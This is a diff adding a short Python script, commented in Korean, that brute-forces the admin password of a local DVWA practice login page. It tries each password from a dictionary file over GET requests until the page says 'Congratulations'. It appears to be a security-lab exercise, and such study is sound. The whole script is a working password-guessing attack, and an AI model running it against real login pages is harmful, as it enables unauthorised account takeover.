@@ -1,0 +1,25 @@
+#low단계
+import urllib           # URL 작업을 위한 여러 모듈을 모은 패키지입니다
+import urllib.parse     # URL을 구성 요소로 구문 분석
+import urllib.request   #url의 반응을 살피는 모듈
+import requests         #HTTP 요청을 보내는 모듈
+
+
+def Web_Attack():
+   url = "http://localhost/3.dvwa/1.brutefource/1-1,2.bruteforce-GET.php"
+   file= open('E:\\python_coding\\dvwa\\1.Bruteforce\\dictionary_attack.txt', 'r')
+   passwords = file.readlines()
+   for password in passwords:
+      payload = {'username':'admin','password':password.replace('\n', ''),'Login':'Login'}
+      r = requests.get(url,payload) #url post 방식에다가 집어 넣는다
+      if(r.text.find("Congratulations") > 0):
+         print("공격성공 비밀번호는 "+password)
+         break
+      else : 
+          print("암호실패!! 공격하는 문자: "+password)
+          
+      
+
+if __name__ == '__main__':
+   print("무차별대입 공격")
+   Web_Attack()
